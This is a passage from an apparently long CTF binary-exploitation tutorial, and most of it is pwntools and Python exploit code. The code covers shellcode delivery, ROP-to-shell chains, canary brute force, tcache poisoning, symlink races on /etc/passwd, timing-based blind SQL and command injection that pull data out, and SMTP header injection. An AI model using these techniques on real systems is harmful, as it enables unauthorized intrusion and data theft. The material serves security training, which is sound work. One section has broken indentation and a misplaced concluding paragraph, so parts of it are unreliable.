s.send(b'request')
response = s.recv(1024)
```

**Connection pooling**

```python
class ConnectionPool:
    def __init__(self, host, port, pool_size=5):
        self.host = host
        self.port = port
        self.pool = [remote(host, port) for _ in range(pool_size)]
        self.available = list(range(pool_size))
    
    def get_connection(self):
        if not self.available:
            return remote(self.host, self.port)
        idx = self.available.pop()
        return self.pool[idx]
    
    def return_connection(self, idx):
        self.available.append(idx)

pool = ConnectionPool('example.com', 4444)
conn = pool.get_connection()
```

**Error handling and retry logic**

```python
def connect_with_retry(host, port, max_retries=3):
    for attempt in range(max_retries):
        try:
            s = remote(host, port, timeout=5)
            return s
        except (ConnectionRefusedError, socket.timeout) as e:
            print(f"Attempt {attempt+1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
    raise Exception("Failed to connect after retries")

s = connect_with_retry('example.com', 4444)
```

---

## Socket Programming for Remote Exploits

Direct socket programming enables low-level control for crafting specialized payloads and protocols.

**Raw socket creation**

```python
import socket

# TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 4444))
sock.send(b'data')
response = sock.recv(1024)
sock.close()

# UDP socket
udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_sock.sendto(b'data', ('example.com', 4444))
response, addr = udp_sock.recvfrom(1024)
```

**HTTP requests (raw)**

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 80))

# HTTP GET request
request = b'GET /index.html HTTP/1.1\r\n'
request += b'Host: example.com\r\n'
request += b'Connection: close\r\n\r\n'

sock.send(request)

# Read response
response = b''
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    response += chunk

sock.close()
```

**HTTP POST with binary data**

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 80))

payload = b'\x48\x31\xc0\x0f\x05'  # Binary shellcode
content_length = len(payload)

request = b'POST /upload HTTP/1.1\r\n'
request += b'Host: example.com\r\n'
request += f'Content-Length: {content_length}\r\n'.encode()
request += b'Content-Type: application/octet-stream\r\n'
request += b'Connection: close\r\n\r\n'
request += payload

sock.send(request)
response = sock.recv(4096)
```

**DNS queries (raw)**

```python
import socket
import struct

def create_dns_query(domain):
    """Create raw DNS query packet"""
    # DNS header
    transaction_id = 0x1234
    flags = 0x0100  # Standard query
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0
    
    header = struct.pack('>HHHHHH',
        transaction_id, flags, questions,
        answer_rrs, authority_rrs, additional_rrs
    )
    
    # Question section
    parts = domain.split('.')
    question = b''
    for part in parts:
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00'
    
    # Query type (A record) and class (IN)
    question += struct.pack('>HH', 1, 1)
    
    return header + question

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
query = create_dns_query('example.com')
sock.sendto(query, ('8.8.8.8', 53))
response, _ = sock.recvfrom(512)
```

**FTP protocol**

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 21))

# Read banner
banner = sock.recv(1024)
print(banner)

# Send credentials
sock.send(b'USER admin\r\n')
response = sock.recv(1024)

sock.send(b'PASS password\r\n')
response = sock.recv(1024)

# List files
sock.send(b'LIST\r\n')
response = sock.recv(4096)

sock.close()
```

**SMTP protocol**

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('example.com', 25))

# Read greeting
response = sock.recv(1024)

# Send EHLO
sock.send(b'EHLO attacker\r\n')
response = sock.recv(1024)

# Send email
sock.send(b'MAIL FROM:<attacker@example.com>\r\n')
response = sock.recv(1024)

sock.send(b'RCPT TO:<victim@example.com>\r\n')
response = sock.recv(1024)

sock.send(b'DATA\r\n')
response = sock.recv(1024)

sock.send(b'Subject: Test\r\nX-Injected: True\r\n\r\nTest\r\n.\r\n')
response = sock.recv(1024)

sock.close()
```

**Custom protocol implementation**

```python
class CustomProtocol:
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
    
    def send_packet(self, msg_type, data):
        """Send custom protocol packet"""
        # Header: type (1 byte) + length (4 bytes)
        header = struct.pack('>BI', msg_type, len(data))
        self.sock.send(header + data)
    
    def recv_packet(self):
        """Receive custom protocol packet"""
        header = self.sock.recv(5)
        msg_type, length = struct.unpack('>BI', header)
        data = self.sock.recv(length)
        return msg_type, data
    
    def close(self):
        self.sock.close()

client = CustomProtocol('example.com', 4444)
client.send_packet(1, b'Hello')
msg_type, response = client.recv_packet()
client.close()
```

**Shellcode delivery over socket**

```python
def send_shellcode_payload(host, port, shellcode):
    """Send shellcode through network service"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Protocol-specific shellcode injection
    # Example: buffer overflow
    offset = 40
    payload = shellcode
    payload += b'A' * (offset - len(shellcode))
    payload += p64(return_address)
    
    sock.send(payload)
    
    # Interact with spawned shell
    sock.send(b'cat /flag\n')
    response = sock.recv(1024)
    
    sock.close()
    return response

result = send_shellcode_payload('example.com', 4444, shellcode)
```

**Packet crafting with scapy**

```python
from scapy.all import IP, TCP, Raw, send, sr

# Craft custom TCP packet
packet = IP(dst='example.com')/TCP(dport=4444, flags='S')/Raw(load=b'payload')
response = sr1(packet)

# Send raw payload
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
sock.sendto(packet, ('example.com', 0))
```

---

## Exploit Reliability Improvement

Improving exploit reliability ensures consistent success across runs, addressing ASLR, timing issues, and race conditions.

**ASLR handling**

```python
def reliable_exploit():
    """Exploit handling ASLR"""
    while True:
        try:
            p = process('./binary')
            
            # Leak addresses
            leak = leak_addresses(p)
            libc_base = calculate_base(leak)
            
            # Build exploit with leaked addresses
            payload = build_payload(libc_base)
            
            p.send(payload)
            
            # Check for success
            if b'flag{' in p.recv(1024):
                return "Success!"
            else:
                p.close()
                continue
        except Exception as e:
            print(f"Attempt failed: {e}")
            p.close()
            continue
```

**Timeout handling**

```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Exploit timeout")

def reliable_send_with_timeout(p, data, timeout=5):
    """Send with timeout"""
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    
    try:
        p.send(data)
        response = p.recv(4096, timeout=timeout)
        signal.alarm(0)  # Cancel alarm
        return response
    except TimeoutError:
        p.close()
        return None
```

**Retry logic with backoff**

```python
def exploit_with_retry(binary, max_retries=10):
    """Exploit with exponential backoff retry"""
    for attempt in range(max_retries):
        try:
            p = process(binary)
            
            # Attempt exploitation
            exploit_result = attempt_exploit(p)
            
            if exploit_result == 'SUCCESS':
                return exploit_result
            
            p.close()
        except Exception as e:
            print(f"Attempt {attempt+1} failed: {e}")
        
        # Exponential backoff
        wait_time = 2 ** attempt
        print(f"Retrying in {wait_time} seconds...")
        time.sleep(wait_time)
    
    return "FAILED"
```

**Brute-force with reduced search space**

When ASLR partially randomizes:

```python
def brute_force_partial_aslr():
    """Exploit partial ASLR through brute force"""
    for base_attempt in range(256):  # 8-bit variations
        libc_base = 0x7ffff7000000 + base_attempt * 0x1000
        
        try:
            p = process('./binary')
            
            # Build payload with guessed base
            system_addr = libc_base + 0x50000
            payload = build_payload(system_addr)
            
            p.send(payload)
            
            # Check for success
            if successful_check(p):
                print(f"Success with base: {hex(libc_base)}")
                return libc_base
            
            p.close()
        except:
            pass
    
    return None
```

**Race condition handling**

```python
import threading

def race_condition_exploit():
    """Exploit race condition through threading"""
    flag_found = False
    
    def worker():
        nonlocal flag_found
        p = process('./binary')
        
        # Send first payload
        p.send(payload1)
        
        # Quickly send second payload (race)
        p.send(payload2)
        
        # Check for success
        response = p.recv(1024)
        if b'flag' in response:
            flag_found = True
    
    # Spawn multiple threads to increase success rate
    threads = []
    for i in range(10):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    return flag_found
```

**Stack alignment compensation**

```python
def align_stack(payload, alignment=16):
    """Ensure stack alignment for exploit"""
    # Calculate required padding
    current_size = len(payload)
    padding_needed = (alignment - (current_size % alignment)) % alignment
    
    # Add padding with NOPs or safe instructions
    payload += b'\x90' * padding_needed
    
    return payload

shellcode = asm(shellcraft.sh())
aligned_payload = align_stack(shellcode)
```

**Canary brute-force**

```python
def brute_force_canary():
    """Brute force stack canary when fork() resets"""
    canary = 0
    
    for byte_pos in range(8):
        for byte_val in range(256):
            # Set current byte
            canary_guess = canary | (byte_val << (byte_pos * 8))
            
            try:
                p = process('./binary')
                
                # Send payload with guessed canary
                payload = overflow_with_canary(canary_guess)
                p.send(payload)
                
                # Check if passed canary check
                response = p.recv(1024, timeout=1)
                
                if no_segfault(response):
                    canary = canary_guess
                    print(f"Found canary byte: {hex(byte_val)}")
                    break
                
                p.close()
            except:
                pass
    
    return canary
```

**Reliability measurement**

```python
def measure_exploit_reliability(exploit_func, iterations=100):
    """Measure exploit success rate"""
    successes = 0
    failures = 0
    
    for i in range(iterations):
        try:
            result = exploit_func()
            if result == 'SUCCESS':
                successes += 1
            else:
                failures += 1
        except Exception as e:
            failures += 1
            print(f"Iteration {i+1} error: {e}")
    
    success_rate = (successes / iterations) * 100
    print(f"Success rate: {success_rate}%")
    return success_rate
```

**Deterministic exploit validation**

```python
def validate_exploit_deterministic():
    """Test exploit in controlled environment"""
    # Disable ASLR for testing
    os.system('setarch x86_64 -R ./binary')
    
    # Run multiple times
    for i in range(10):
        p = process('./binary', aslr=False)  # GDB disables ASLR
        
        # Send exploit
        result = send_exploit(p)
        
        # Verify success
        assert result == 'SUCCESS', f"Iteration {i} failed"
        p.close()
    
    print("Exploit validated deterministically")
```

**Multi-stage reliability**

```python
def multi_stage_reliable_exploit():
    """Exploit with staged approach"""
    while True:
        try:
            p = process('./binary')
            
            # Stage 1: Info leak
            print("[*] Stage 1: Leaking addresses...")
            leak = stage1_leak(p)
            if not leak:
                raise Exception("Stage 1 failed")
            
            # Stage 2: Overflow
            print("[*] Stage 2: Sending overflow...")
            stage2_overflow(p, leak)
            
            # Stage 3: Verify shell
            print("[*] Stage 3: Verifying shell...")
            if stage3_verify(p):
                print("[+] Exploit successful!")
                p.send(b'cat /flag\n')
                return p.recv(1024)
            
            p.close()
        except Exception as e:
            print(f"[-] Exploit failed: {e}")
            try:
                p.close()
            except:
                pass
            time.sleep(1)
```

**Crash detection and recovery**

```python
def exploit_with_crash_recovery():
    """Detect crashes and recover"""
    max_crashes = 5
    crash_count = 0
    
    while crash_count < max_crashes:
        try:
            p = process('./binary')
            
            # Send exploit
            p.send(exploit_payload)
            
            # Monitor for crash
            try:
                response = p.recv(1024, timeout=2)
                if response:
                    return response
            except:
                crash_count += 1
                print(f"Crash detected ({crash_count}/{max_crashes})")
            
            p.close()
        except:
            crash_count += 1
    
    raise Exception("Exploit exceeded crash limit")
```

**Conditional exploit paths**

```python
def adaptive_exploit():
    """Adapt exploit based on environment""" p = process('./binary')

# Detect environment
checksec_output = os.popen('checksec --file=./binary').read()

if 'ASLR' in checksec_output and 'ENABLED' in checksec_output:
    print("[*] ASLR detected, using leak strategy")
    return exploit_with_leak(p)
elif 'CANARY' in checksec_output and 'Enabled' in checksec_output:
    print("[*] Canary detected, using canary bypass")
    return exploit_with_canary_bypass(p)
elif 'NX' in checksec_output and 'ENABLED' in checksec_output:
    print("[*] NX detected, using ROP")
    return exploit_with_rop(p)
else:
    print("[*] No protections, direct shellcode injection")
    return exploit_simple(p)
````

**Performance optimization**

```python
def optimized_exploit_loop():
    """Optimize for speed"""
    import concurrent.futures
    
    def single_exploit():
        p = process('./binary')
        try:
            result = send_exploit(p)
            return result == 'SUCCESS'
        finally:
            p.close()
    
    # Parallel exploitation attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(single_exploit) for _ in range(100)]
        
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                print("[+] Exploit successful!")
                return True
    
    return False
````

**Logging and debugging**

```python
import logging

def setup_exploit_logging():
    """Setup comprehensive logging"""
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('exploit.log'),
            logging.StreamHandler()
        ]
    )
    
    return logging.getLogger(__name__)

logger = setup_exploit_logging()

def logged_exploit():
    """Exploit with detailed logging"""
    logger.info("Starting exploit")
    
    try:
        p = process('./binary')
        logger.info(f"Process spawned: PID={p.pid}")
        
        leak = leak_addresses(p)
        logger.info(f"Leaked addresses: {leak}")
        
        payload = build_payload(leak)
        logger.debug(f"Payload size: {len(payload)}")
        
        p.send(payload)
        logger.info("Payload sent")
        
        response = p.recv(1024)
        logger.info(f"Response: {response[:100]}")
        
        return response
    except Exception as e:
        logger.error(f"Exploit failed: {e}", exc_info=True)
        return None
```

**Health checks**

```python
def pre_exploit_health_check():
    """Verify binary and environment before exploitation"""
    checks = {
        'binary_exists': os.path.exists('./binary'),
        'binary_executable': os.access('./binary', os.X_OK),
        'sufficient_memory': psutil.virtual_memory().available > 100*1024*1024,
        'no_processes_limit': len(psutil.Process().children(recursive=True)) < 50,
    }
    
    for check_name, result in checks.items():
        status = "✓" if result else "✗"
        print(f"[{status}] {check_name}")
        if not result:
            raise Exception(f"Health check failed: {check_name}")
    
    print("[+] All health checks passed")
```

---

**Related CTF-specific subtopics essential for comprehensive competition success:** Chaining multiple vulnerabilities for complex exploitation paths, creating exploit aggregators handling multiple binary variants, and developing automated CTF flag submission systems integrating with competition platforms like CTFTime, picoCTF scoreboards, and custom flag servers.

This concludes the comprehensive CTF Binary Exploitation guide covering reconnaissance, reverse engineering, memory corruption vulnerabilities, stack exploitation, protection mechanisms, bypass techniques, shellcoding, exploitation frameworks, debugging strategies, and CTF-specific techniques. Mastery of these topics enables reliable exploitation development across diverse binary security challenges.

---

## Race Condition Exploitation

### Overview

Race conditions occur when multiple threads/processes access shared resources without proper synchronization, creating exploitable timing windows.

### TOCTOU (Time-of-Check-Time-of-Use)

**Classic File Race**:

```c
// Vulnerable code pattern
if (access("/tmp/user_file", W_OK) == 0) {  // Check
    fd = open("/tmp/user_file", O_RDWR);    // Use
    write(fd, sensitive_data, size);
}
```

**Exploitation Strategy**:

```bash
#!/bin/bash
# Race script
while true; do
    ln -sf /etc/passwd /tmp/user_file
    ln -sf /tmp/safe_file /tmp/user_file
done &

# Run vulnerable program repeatedly
while true; do
    ./vulnerable_program
done
```

**Python Race Automation**:

```python
#!/usr/bin/env python3
from pwn import *
import threading
import os

def race_symlink():
    """Continuously swap symlink target"""
    while not stop_flag.is_set():
        try:
            os.unlink('/tmp/race_file')
            os.symlink('/tmp/safe', '/tmp/race_file')
            os.unlink('/tmp/race_file')
            os.symlink('/etc/passwd', '/tmp/race_file')
        except:
            pass

def exploit():
    """Run vulnerable program"""
    for i in range(1000):
        try:
            io = process('./vulnerable')
            io.sendline(b'/tmp/race_file')
            result = io.recvall(timeout=1)
            if b'root:' in result:
                log.success(f'Success on iteration {i}')
                stop_flag.set()
                return result
            io.close()
        except:
            pass

stop_flag = threading.Event()
racer = threading.Thread(target=race_symlink, daemon=True)
racer.start()

result = exploit()
print(result)
```

### Thread-based Race Conditions

**Identifying Vulnerable Code**:

```c
// Vulnerable: Non-atomic check-and-use
if (balance >= amount) {           // Thread 1 checks
    // Race window here!
    balance -= amount;              // Thread 1 uses
}
```

**Multi-threaded Exploitation**:

```python
#!/usr/bin/env python3
from pwn import *
import threading

def worker(thread_id):
    """Each thread attempts exploitation"""
    try:
        io = remote('challenge.ctf', 1337)
        
        # Trigger race condition
        io.sendline(b'WITHDRAW 1000')
        
        response = io.recvline()
        if b'success' in response:
            log.success(f'Thread {thread_id} won race!')
            with lock:
                results.append(response)
        
        io.close()
    except:
        pass

lock = threading.Lock()
results = []
threads = []

# Launch many concurrent attempts
for i in range(100):
    t = threading.Thread(target=worker, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

log.info(f'Total successes: {len(results)}')
```

### Signal Handler Races

**Vulnerable Pattern**:

```c
// Global state modified in signal handler
volatile int authenticated = 0;

void alarm_handler(int sig) {
    authenticated = 0;  // Reset auth
}

// Main code
signal(SIGALRM, alarm_handler);
alarm(5);
authenticate_user();
authenticated = 1;
// Race: signal can fire here
perform_privileged_operation();  // May execute unauthenticated
```

**Exploitation with Precise Timing**:

```python
#!/usr/bin/env python3
from pwn import *
import time

io = remote('target', 1337)

# Trigger authentication
io.sendline(b'LOGIN admin')
io.recvuntil(b'Password: ')
io.sendline(b'password123')

# Wait until just before timeout
time.sleep(4.95)  # 5 second timeout

# Spam privileged command during race window
for _ in range(100):
    io.sendline(b'ADMIN_COMMAND')

io.interactive()
```

### Heap Race Conditions

**Use-After-Free via Race**:

```python
#!/usr/bin/env python3
from pwn import *
import threading

def allocate_free():
    """Thread 1: Allocate and free"""
    io1 = remote('target', 1337)
    io1.sendline(b'ALLOC 0x100')
    io1.sendline(b'FREE 0')
    io1.close()

def use_dangling():
    """Thread 2: Use freed memory"""
    io2 = remote('target', 1337)
    io2.sendline(b'USE 0')  # Race to use after free
    result = io2.recvall()
    if b'flag{' in result:
        log.success(f'Got flag: {result}')
    io2.close()

# Synchronize threads for maximum race window
for attempt in range(1000):
    t1 = threading.Thread(target=allocate_free)
    t2 = threading.Thread(target=use_dangling)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
    
    if attempt % 100 == 0:
        log.info(f'Attempt {attempt}')
```

### Race Condition Debugging

**Using rr for Race Analysis**:

```bash
# Record multiple runs until race occurs
for i in {1..100}; do
    rr record ./vulnerable_threaded
    if grep -q "corrupted" output.log; then
        echo "Race caught in recording $i"
        break
    fi
done

# Replay with thread analysis
rr replay
```

```gdb
(gdb) info threads
(gdb) thread 2
(gdb) break suspicious_function
(gdb) continue
(gdb) reverse-continue  # Find when corruption started
```

**DTrace/SystemTap Monitoring** [Inference - requires kernel support]:

```bash
# Monitor syscall races
strace -f -e open,access ./vulnerable 2>&1 | grep -A1 access
```

### Exploitation Techniques

**Maximizing Race Window**:

```python
# CPU pinning to increase race probability
import os
os.sched_setaffinity(0, {0})  # Pin to CPU 0

# Thread priority manipulation
import ctypes
libc = ctypes.CDLL('libc.so.6')
# SCHED_FIFO requires root [Unverified in CTF contexts]
```

**Synchronization Primitives**:

```python
import threading

barrier = threading.Barrier(2)  # Wait for both threads

def thread1():
    # Setup
    barrier.wait()  # Synchronize start
    # Race operation

def thread2():
    # Setup
    barrier.wait()  # Synchronize start
    # Race operation
```

---

## Time-based Attacks

### Timing Side Channels

**Password Comparison Timing**:

```python
#!/usr/bin/env python3
from pwn import *
import time
import string

def time_comparison(password_attempt):
    """Measure response time for password attempt"""
    io = remote('target', 1337)
    
    start = time.time()
    io.sendlineafter(b'Password: ', password_attempt.encode())
    io.recvuntil(b'Invalid', timeout=2)
    elapsed = time.time() - start
    
    io.close()
    return elapsed

def exploit_timing():
    """Character-by-character password recovery"""
    known = ""
    
    for position in range(32):  # Max password length
        best_char = None
        max_time = 0
        
        for char in string.printable:
            attempt = known + char
            
            # Average multiple attempts for stability
            times = []
            for _ in range(10):
                times.append(time_comparison(attempt))
            
            avg_time = sum(times) / len(times)
            log.info(f'Testing {attempt}: {avg_time:.6f}s')
            
            if avg_time > max_time:
                max_time = avg_time
                best_char = char
        
        if best_char:
            known += best_char
            log.success(f'Found: {known}')
        else:
            break
    
    return known

password = exploit_timing()
log.success(f'Password: {password}')
```

**Statistical Analysis**:

```python
import statistics

def measure_with_confidence(payload, samples=50):
    """Measure timing with statistical confidence"""
    times = []
    
    for _ in range(samples):
        start = time.perf_counter()  # High precision timer
        io = remote('target', 1337)
        io.send(payload)
        io.recv(timeout=1)
        io.close()
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    
    mean = statistics.mean(times)
    stdev = statistics.stdev(times)
    
    log.info(f'Mean: {mean:.6f}s, StdDev: {stdev:.6f}s')
    return mean, stdev

# Compare two payloads
time1, dev1 = measure_with_confidence(b'payload1')
time2, dev2 = measure_with_confidence(b'payload2')

# Significant difference if means differ by >2 standard deviations [Inference]
if abs(time1 - time2) > 2 * max(dev1, dev2):
    log.success('Timing difference detected!')
```

### Sleep-based Oracles

**Blind SQLi with Time Delays**:

```python
#!/usr/bin/env python3
from pwn import *
import time

def test_sql_timing(injection):
    """Test if SQL injection causes delay"""
    payload = f"admin' AND {injection} AND SLEEP(5)-- "
    
    io = remote('target', 80)
    io.send(f'POST /login HTTP/1.1\r\n')
    io.send(f'Host: target\r\n')
    io.send(f'Content-Length: {len(payload)}\r\n\r\n')
    io.send(payload.encode())
    
    start = time.time()
    try:
        io.recvuntil(b'Invalid', timeout=7)
    except:
        pass
    elapsed = time.time() - start
    io.close()
    
    return elapsed > 4.5  # True if sleep executed

def extract_database():
    """Extract database name character by character"""
    db_name = ""
    
    for pos in range(1, 32):
        for char_code in range(32, 127):
            injection = f"ASCII(SUBSTRING(database(),{pos},1))={char_code}"
            
            if test_sql_timing(injection):
                db_name += chr(char_code)
                log.success(f'Found: {db_name}')
                break
        else:
            break  # No more characters
    
    return db_name

database = extract_database()
log.success(f'Database: {database}')
```

### Cache-based Timing Attacks

**Prime+Probe Cache Timing** [Inference - highly system-dependent]:

```python
import ctypes
import time

# Flush cache line (x86-64 specific)
def clflush(address):
    """Flush cache line containing address"""
    # Implementation requires inline assembly or ctypes
    # [Unverified] May require specific CPU features
    pass

def time_memory_access(address):
    """Measure memory access time"""
    clflush(address)
    
    start = time.perf_counter()
    _ = ctypes.c_void_p.from_address(address).value
    elapsed = time.perf_counter() - start
    
    return elapsed

# Cached access: ~5 cycles, Uncached: ~200 cycles [Inference]
```

### Timing Attack Mitigations Bypass

**Constant-time Comparison Bypass**:

```python
# Some implementations add fixed delay - can still leak via timing variance
def advanced_timing_attack():
    """Detect timing differences despite constant-time attempts"""
    baseline_times = []
    
    # Establish baseline with invalid input
    for _ in range(100):
        t = time_comparison("AAAAAAAAAA")
        baseline_times.append(t)
    
    baseline = statistics.median(baseline_times)
    
    # Test each character
    for char in string.printable:
        test_times = []
        for _ in range(100):
            t = time_comparison("A" + char)
            test_times.append(t)
        
        test_median = statistics.median(test_times)
        
        # Statistical test: Mann-Whitney U test [Inference]
        if abs(test_median - baseline) > threshold:
            log.info(f'Character {char} shows timing difference')
```

### Network Timing Considerations

**Compensating for Network Jitter**:

```python
from pwn import *
import statistics

def robust_timing_measurement(payload, samples=100):
    """Local timing measurement to reduce network noise"""
    # Option 1: Make many measurements and use median
    times = []
    for _ in range(samples):
        start = time.perf_counter()
        io = remote('target', 1337, level='error')  # Suppress logs
        io.send(payload)
        io.recv(timeout=2)
        io.close()
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    
    # Use median to reduce outlier impact
    return statistics.median(times)

# Option 2: Use persistent connection
def persistent_timing(payloads):
    """Single connection for multiple tests"""
    io = remote('target', 1337)
    results = []
    
    for payload in payloads:
        start = time.perf_counter()
        io.send(payload)
        io.recvuntil(b'>', timeout=2)
        elapsed = time.perf_counter() - start
        results.append(elapsed)
    
    io.close()
    return results
```

### Blind Command Injection with Timing

**Time-based Command Injection**:

```python
#!/usr/bin/env python3
from pwn import *

def test_command_injection(command):
    """Test if command executes via timing"""
    payload = f"; {command} #"
    
    io = remote('target', 1337)
    io.sendlineafter(b'Command: ', payload.encode())
    
    start = time.time()
    try:
        io.recvline(timeout=10)
    except:
        pass
    elapsed = time.time() - start
    io.close()
    
    return elapsed

# Test for command execution
if test_command_injection('sleep 5') > 4.5:
    log.success('Command injection confirmed!')
    
    # Exfiltrate data via timing
    def exfil_byte(position):
        for byte_val in range(256):
            cmd = f'[ $(od -An -N1 -j{position} flag.txt | tr -d " ") -eq {byte_val} ] && sleep 2'
            if test_command_injection(cmd) > 1.5:
                return byte_val
        return None
    
    flag = b''
    pos = 0
    while True:
        byte = exfil_byte(pos)
        if byte is None or byte == 0:
            break
        flag += bytes([byte])
        log.info(f'Flag: {flag}')
        pos += 1
```

---

## Multi-stage Exploitation

### Information Leak + Code Execution

**Stage 1: Leak Addresses**:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')

def stage1_leak_libc():
    """Stage 1: Leak libc address"""
    io = remote('target', 1337)
    
    # Build ROP chain to leak puts
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(elf.symbols['main'])  # Return to main for stage 2
    
    payload = flat(
        b'A' * 72,
        rop.chain()
    )
    
    io.sendlineafter(b'Input: ', payload)
    io.recvline()  # Skip output
    
    leaked = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leaked - libc.symbols['puts']
    
    log.success(f'Libc base: {hex(libc.address)}')
    return io, libc

def stage2_exploit(io, libc):
    """Stage 2: Execute shell with known libc"""
    rop = ROP(libc)
    rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
    
    payload = flat(
        b'A' * 72,
        rop.chain()
    )
    
    io.sendlineafter(b'Input: ', payload)
    io.interactive()

# Execute both stages
io, libc = stage1_leak_libc()
stage2_exploit(io, libc)
```

**Persistence Between Stages**:

```python
def multi_stage_persistent():
    """Maintain state across multiple interactions"""
    io = remote('target', 1337)
    state = {}
    
    # Stage 1: Leak stack cookie
    io.sendline(b'1')  # Select leak option
    io.recvuntil(b'Cookie: ')
    state['canary'] = int(io.recvline().strip(), 16)
    log.success(f'Canary: {hex(state["canary"])}')
    
    # Stage 2: Leak PIE base
    io.sendline(b'2')
    io.recvuntil(b'Code: ')
    leaked_code = int(io.recvline().strip(), 16)
    state['pie_base'] = leaked_code - 0x1234  # Offset to known function
    log.success(f'PIE base: {hex(state["pie_base"])}')
    
    # Stage 3: Exploit with leaked values
    io.sendline(b'3')
    exploit = build_exploit(state)
    io.send(exploit)
    io.interactive()
```

### Heap Grooming Stages

**Multi-stage Heap Exploitation**:

```python
#!/usr/bin/env python3
from pwn import *

def heap_stage1_groom():
    """Stage 1: Prepare heap layout"""
    io = remote('target', 1337)
    
    # Fill tcache bins
    for i in range(7):
        io.sendline(b'ALLOC 0x100')
    
    for i in range(7):
        io.sendline(f'FREE {i}'.encode())
    
    log.success('Tcache groomed')
    return io

def heap_stage2_leak(io):
    """Stage 2: Create heap leak"""
    # Allocate to get tcache chunk with fd pointer
    io.sendline(b'ALLOC 0x100')
    io.sendline(b'SHOW 7')
    
    io.recvuntil(b'Data: ')
    heap_leak = u64(io.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak - 0x290  # Offset from leak to heap base [Inference]
    
    log.success(f'Heap base: {hex(heap_base)}')
    return io, heap_base

def heap_stage3_corrupt(io, heap_base):
    """Stage 3: Corrupt tcache"""
    target = heap_base + 0x10  # Target location
    
    # Trigger tcache poisoning
    io.sendline(b'ALLOC 0x100')
    io.sendline(b'FREE 7')
    io.sendline(b'FREE 8')  # Double free
    
    # Corrupt fd pointer
    io.sendline(b'EDIT 8')
    io.send(p64(target))
    
    # Allocate to arbitrary location
    io.sendline(b'ALLOC 0x100')
    io.sendline(b'ALLOC 0x100')  # Now points to target
    
    log.success('Tcache corrupted')
    return io

def heap_stage4_exploit(io):
    """Stage 4: Write to arbitrary location"""
    # Write __free_hook or similar
    io.sendline(b'EDIT 10')
    io.send(p64(0xdeadbeef))  # Overwrite target
    
    io.interactive()

# Execute all stages
io = heap_stage1_groom()
io, heap_base = heap_stage2_leak(io)
io = heap_stage3_corrupt(io, heap_base)
heap_stage4_exploit(io)
```

### Chained Vulnerability Exploitation

**Format String -> Buffer Overflow**:

```python
#!/usr/bin/env python3
from pwn import *

def vuln1_format_string_leak():
    """Vulnerability 1: Format string to leak stack cookie"""
    io = remote('target', 1337)
    
    # Find canary offset
    io.sendline(b'%11$p')  # Example offset
    io.recvuntil(b'0x')
    canary = int(io.recv(16), 16)
    
    log.success(f'Canary: {hex(canary)}')
    return io, canary

def vuln2_buffer_overflow(io, canary):
    """Vulnerability 2: Buffer overflow with leaked canary"""
    rop = ROP('./binary')
    rop.call('system', [next(elf.search(b'/bin/sh'))])
    
    payload = flat(
        b'A' * 104,
        canary,
        b'B' * 8,  # Saved RBP
        rop.chain()
    )
    
    io.sendline(b'EXPLOIT')
    io.send(payload)
    io.interactive()

# Chain vulnerabilities
io, canary = vuln1_format_string_leak()
vuln2_buffer_overflow(io, canary)
```

### State Machine Exploitation

**Navigating Complex Program States**:

```python
#!/usr/bin/env python3
from pwn import *

class StateManager:
    """Track and manipulate program state"""
    
    def __init__(self):
        self.io = remote('target', 1337)
        self.state = 'INIT'
        self.resources = {}
    
    def transition(self, action):
        """Perform state transition"""
        if self.state == 'INIT' and action == 'login':
            self.io.sendline(b'LOGIN admin')
            self.io.sendline(b'password')
            self.state = 'AUTHENTICATED'
        
        elif self.state == 'AUTHENTICATED' and action == 'allocate':
            self.io.sendline(b'ALLOC 0x100')
            self.resources['ptr'] = self.get_allocation()
            self.state = 'ALLOCATED'
        
        elif self.state == 'ALLOCATED' and action == 'exploit':
            self.send_payload()
            self.state = 'EXPLOITED'
        
        log.info(f'State: {self.state}')
    
    def get_allocation(self):
        self.io.recvuntil(b'Address: ')
        return int(self.io.recvline().strip(), 16)
    
    def send_payload(self):
        payload = self.build_exploit()
        self.io.sendline(payload)
    
    def build_exploit(self):
        # Build based on current state and resources
        return b'exploit_payload'

# Execute state machine
sm = StateManager()
sm.transition('login')
sm.transition('allocate')
sm.transition('exploit')
sm.io.interactive()
```

### Partial Overwrite Chaining

**Stage 1: Partial GOT Overwrite**:

```python
def stage1_partial_overwrite():
    """Overwrite last byte of GOT entry"""
    io = remote('target', 1337)
    
